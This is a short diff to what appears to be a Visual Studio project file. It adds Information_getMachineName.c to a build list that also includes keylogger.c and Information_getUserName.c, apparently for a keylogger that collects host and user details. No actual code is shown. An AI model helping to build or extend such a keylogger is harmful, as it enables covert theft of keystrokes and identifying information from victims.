@@ -144,6 +144,7 @@
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClCompile Include="Information.c" />
+    <ClCompile Include="Information_getMachineName.c" />
     <ClCompile Include="Information_getUserName.c" />
     <ClCompile Include="initialize.c" />
     <ClCompile Include="keylogger.c" />
